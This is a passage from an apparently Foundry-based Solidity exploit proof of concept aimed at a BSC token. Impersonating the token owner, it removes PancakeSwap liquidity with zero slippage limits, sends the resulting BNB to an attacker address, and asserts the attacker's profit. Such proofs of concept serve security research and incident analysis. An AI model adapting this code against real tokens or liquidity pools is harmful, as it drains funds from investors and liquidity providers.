            // Get initial owner BNB balance
            uint256 ownerInitialBNB = address(tokenOwner).balance;

            // Approve router to spend LP tokens
            IERC20(pair).approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, lpBalance);

            // Remove liquidity
            uint256 amountETH = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E).removeLiquidityETHSupportingFeeOnTransferTokens(
                TARGET,
                lpBalance,
                0,
                0,
                tokenOwner,
                block.timestamp + 1000
            );

            uint256 ownerFinalBNB = address(tokenOwner).balance;
            console.log("Owner BNB from burning LP:", ownerFinalBNB - ownerInitialBNB);
        }
        vm.stopPrank();

        // 10. Transfer owner's BNB to attacker to show profit
        uint256 ownerBNBBalance = address(tokenOwner).balance;
        if (ownerBNBBalance > 0) {
            vm.prank(tokenOwner);
            (bool success, ) = attacker.call{value: ownerBNBBalance}("");
            require(success, "Transfer failed");
        }

        // Final balance check
        uint256 finalBalance = address(attacker).balance;
        console.log("Initial BNB balance:", initialBalance);
        console.log("Final BNB balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);

        // Assert profit
        assertGt(finalBalance, initialBalance, "BNB balance should increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

